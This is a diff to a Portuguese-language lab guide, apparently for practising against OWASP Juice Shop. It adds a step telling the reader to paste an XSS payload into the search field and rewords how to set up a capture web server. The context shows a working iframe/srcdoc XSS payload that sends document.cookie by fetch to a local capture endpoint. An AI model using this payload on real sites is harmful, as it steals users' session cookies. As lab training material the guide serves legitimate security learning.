@@ -22,12 +22,14 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
 ```
 Payload XSS para teste:
+
+Copie o payload e cole no campo de pesquisa do Juice-Shop
 ```
 <iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
 ```
 ## Web-Server Exfiltration Web Link Python
 
-Criar uma pasta Web-srv
+Criar um diretório com o nome Web-srv
 
 Copiar o código e salvar como web-srv.py
 
